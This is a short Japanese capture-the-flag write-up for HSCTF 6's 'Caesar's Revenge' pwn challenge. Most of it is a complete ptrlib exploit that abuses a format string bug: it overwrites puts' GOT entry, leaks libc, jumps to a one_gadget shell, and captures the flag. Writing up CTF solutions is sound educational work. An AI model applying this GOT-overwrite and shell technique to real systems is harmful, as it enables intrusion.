# [pwn 427pts] Caesar's Revenge - HSCTF 6
64ビットでいろいろ有効です。
```
$ checksec -f caesars-revenge
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols     Yes	0		4	caesars-revenge
```

シーザー暗号のサービスです。
FSBがあるのでputsのGOTを変更してやっていきます。
ptrlibのFSBはこのチャレンジ中に完成したのですらすら使えました。

```python
from ptrlib import *

def decode(data, key):
    out = b''
    for c in data:
        if ord("a") <= c <= ord("z") or ord("A") <= c <= ord("Z"):
            out += bytes([c - 1])
        else:
            out += bytes([c])
    return out

elf = ELF("./caesars-revenge")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./caesars-revenge")
#delta = 0xe7
libc = ELF("libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("pwn.hsctf.com", 4567)
delta = 0xf0

# Stage 1
writes = {elf.got("puts"): elf.symbol("caesar")}
payload = fsb(
    pos = 24,
    writes = writes,
    bs = 1,
    bits = 64
)
sock.recvuntil(": ")
sock.sendline(decode(payload, 1))
sock.recvuntil("shift: ")
sock.sendline("1")

# Stage 2
payload = b'%117$p'
sock.recvuntil(": ")
sock.sendline(decode(payload, 1))
sock.recvuntil("shift: ")
sock.sendline("1")
sock.recvuntil("Result: ")
addr_libc_start_main = int(sock.recvline().rstrip(), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - delta
logger.info("libc base = " + hex(libc_base))

# Stage 3
one_gadget = libc_base + 0x4526a
writes = {elf.got("puts"): one_gadget}
payload = fsb(
    pos = 24,
    writes = writes,
    bs = 1,
    bits = 64
)
sock.recvuntil(": ")
sock.sendline(decode(payload, 1))
sock.recvuntil("shift: ")
sock.sendline("1")

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:4567
[+] <module>: libc base = 0x7fc7934df000
[ptrlib]$ cat flag
Result:                                                                                                                                                                                                                                                                                                                                                 À                                                                                                                                                                                                                                                                                                                                                                                                                                         ù                                                                                                                                                                                                                                                               c@@[ptrlib]$ hsctf{should_have_left_%n_back_in_ancient_rome}
```

# 感想
FSBは得意分野なので楽しい。